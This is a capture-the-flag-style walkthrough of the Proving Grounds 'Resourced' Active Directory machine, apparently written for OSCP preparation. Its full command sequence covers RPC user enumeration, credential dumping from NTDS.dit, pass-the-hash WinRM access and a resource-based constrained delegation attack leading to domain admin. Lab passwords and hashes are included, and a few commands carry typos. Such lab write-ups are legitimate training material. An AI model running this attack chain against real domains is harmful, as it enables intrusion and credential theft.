---
title: Resourced Walkthrough - Proving grounds
tags: AD RPC Bloodhound Resource-based-constrained-delegation
categories: Windows
---
In this entry I will solve PG's Resourced machine. It is an active directory machine in the [TJNull](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) list. My purpose in sharing this post is to prepare for OSCP exam. It is also to show you the way if you are in trouble. Please try to understand each step and take notes.

# Port and service enumeration

`nmap -sC -sV -p53,135,445,139,3389,5985,9398,3296,636,389,88,593,3268,464 192.168.191.175 -Pn -o targeted.txt`

![326c011dfa97c165e404a6996cbd970c.png](/assets/img/screenshots/Resourced326c011dfa97c165e404a6996cbd970c.png)

## Domain enumeration with crackmapexec

As SMB ports are opened, i am going to enumerate the domain with crackmapexec

`crackmapexec smb 192.168.191.175`

![9717d3a06f090ae2b07008dbd4677b05.png](/assets/img/screenshots/Resourced9717d3a06f090ae2b07008dbd4677b05.png)

This reveals the domain name, add it to /etc/hosts

## List SMB shared folders (failed)

`crackmapexec smb 192.168.191.175 --shares`

![0377aa969ee8e142174793315d958c5a.png](/assets/img/screenshots/Resourced0377aa969ee8e142174793315d958c5a.png)

`smbmap -H 192.168.191.175 -u df`

![2975df7a02cf15c16afd99c760a11d5d.png](/assets/img/screenshots/Resourced2975df7a02cf15c16afd99c760a11d5d.png)

## DNS - Domain Zone transfer attack (failed)

`dig @192.168.191.175 resourced.local axfr`

![f6ab636706c1b582779927a2e489d0ef.png](/assets/img/screenshots/Resourcedf6ab636706c1b582779927a2e489d0ef.png)

## LDAP enumeration

`sudo ldapsearch -x -H ldap://192.168.191.175 -b '' -s base '(objectClass=*)' namingcontexts`

![a9e3ebd57b2600c8da254a825ae02b58.png](/assets/img/screenshots/Resourceda9e3ebd57b2600c8da254a825ae02b58.png)

## RPC user enumeration (succeded)

`rpcclient 192.168.191.175 -U "" -N`

`enumdomusers`

![1465640549d4f6340ed6847bc378dc0f.png](/assets/img/screenshots/Resourced1465640549d4f6340ed6847bc378dc0f.png)

This reveals all the active users in the domain. Easily parse and then add it to a users.txt file i use the following command:

`rpcclient 192.168.191.175 -U '' -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt`

## ASPREProast (failed)

Having a list of possible valid users, I try an ASPREProast attack.

`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py resourced.local/ -u users.txt -dc-ip 192.168.191.175`

![a8e79b0c98e51bec72361e75ff1b42bc.png](/assets/img/screenshots/Resourceda8e79b0c98e51bec72361e75ff1b42bc.png)

# Getting a shell

## Back to RPC enumeration (found password)

rpcclient 192.168.191.175 -U "" -N

querydispinfo

![07fe39ddcc80c25b66a1663011a28991.png](/assets/img/screenshots/Resourced07fe39ddcc80c25b66a1663011a28991.png)

This shows the "V.ventz" user's description. Here a password is found "HotelCalifornia194!"

Check user validation with crackmapexec

![15a27d63b9c33997f4ebf4c77322b831.png](/assets/img/screenshots/Resourced15a27d63b9c33997f4ebf4c77322b831.png)

![80a89501473ace0b5f32bd0b705b27a9.png](/assets/img/screenshots/Resourced80a89501473ace0b5f32bd0b705b27a9.png)

## SMB Connection

If I try to connect through SMB i get "Error NT_STATUS_RESOURCE_NAME_NOT_FOUND" error

![5f01bc712a0ad54932015f1a5553a69f.png](/assets/img/screenshots/Resourced5f01bc712a0ad54932015f1a5553a69f.png)

I try with impacket's smbclient:

`impacket-smbclient V.Ventz:'HotelCalifornia194!'@resourced.local`

In "Password Audit" folder i find those 2 files:

![abcf64e5a60c3864896ab35987f94738.png](/assets/img/screenshots/Resourcedabcf64e5a60c3864896ab35987f94738.png)

Reading about ntds.dit file I came across this [article](https://www.hackingarticles.in/credential-dumping-ntds-dit/) that shows how to dump the file to get hases:

I get  the ntds.dit file and SYSTEM file, located in /Password Audit/Registry

Using `impacket-secretsdump -ntds ntds.dit -system SYSTEM | tee secrets`  command I get the hashes

Easily parse the hashes with `cat secrets| cut -d ":" -f4 > hashes`

![a981f45e33d9a16aef0ee5a7e9c5474f.png](/assets/img/screenshots/Resourceda981f45e33d9a16aef0ee5a7e9c5474f.png)

## WinRM connection

After that, I check if a connection though evilwinrm is possible with crtackmapexec (Pwn3d!)

crackmapexec winrm 192.168.191.175 -u users.txt -H hashes

![04f74bae0eb4f450e19efe9655fdb97c.png](/assets/img/screenshots/Resourced046db56c571a4d9dba18aa347f708bde.png)

evil-winrm -i 192.168.191.175 -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'7

# Lateral movement

## Bloodhound

After establishing the connection I check some possible Privesc vectors but is nor possible, at this point I use bloodhound.

After getting the zip and uploading to the application. In node info y click over "OutboundObject Control". This gives me a possible attack path,  performing a resource based constrained delegation attack.

![b6a88243609a5d70313a1f62e8a78ffb.png](/assets/img/screenshots/Resourcedb6a88243609a5d70313a1f62e8a78ffb.png)

# Privilege escalation

## Resource-based-constrained-delegation attack

I'll use Hactricks guide to get administative privileges. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation

First of all I move Powerview, Powermad and rubeus.exe from my attacker machine to  the EvilWinRM session.

![2aecf55d5bc96bf52978de3fb0148a6d.png](/assets/img/screenshots/Resourced2aecf55d5bc96bf52978de3fb0148a6d.png)

`Import-Module .\Powermad.ps1`

`New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose`

`Import-Module .\PowerView.ps1`

`Get-DomainComputer SERVICEA #Check if created if you have powerview`

![c6c891b31d06ed6bfb8131ca17d96e46.png](/assets/img/screenshots/Resourcedc6c891b31d06ed6bfb8131ca17d96e46.png)

`$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid`

`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"`

`$SDBytes = New-Object byte[] ($SD.BinaryLength)`

`$SD.GetBinaryForm($SDBytes, 0)`

`hostname #to check the machine name`

`Get-DomainComputer MACHINENAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`

Check if worked

`Get-DomainComputer MACHINENAME -Properties 'msds-allowedtoactonbehalfofotheridentity'`

![a668bc720963259eadb98d20a7cccf7d.png](/assets/img/screenshots/Resourceda668bc720963259eadb98d20a7cccf7d.png)

It is possible to get the ticket in 2 different ways (Rubeus and impacket-getST)

## Rubeus

`.\Rubeus.exe hash /password:123456 /user:SERIVCEA  /domain:resourced.local`

`![47f0a1a74c820e101205da8c7524571b.png](file:///C:/Users/Jon/.config/joplin-desktop/resources/7523e56696cb4df6b9712dc972e8e434.png)`

`.\Rubeus.exe s4u /user:SERVICEA /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /ptt`

![4bff73fce72d2eef75210c932f085509.png](/assets/img/screenshots/Resourced4bff73fce72d2eef75210c932f085509.png)

Grab administrator's hash and convert to .kirbi

`base64 -d ticket.kirbi.b64 > ticket.kirbi`

## impacket-getST

`sudo impacket-getST -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip 192.168.191.175 resourced.local/SERVICEA$:123456`

![4be8af17f229ab80dcf7b4f971d5fa2c.png](/assets/img/screenshots/Resourced4be8af17f229ab80dcf7b4f971d5fa2c.png)

Add resourcedc.resourced.local entry to /etc/hosts and run the command

`impacket-psexec -k resourcedc.resourced.local`

![1c139b8a17abfd25877be8716f8dde2b.png](/assets/img/screenshots/Resourced1c139b8a17abfd25877be8716f8dde2b.png)

Pwn3d! :D
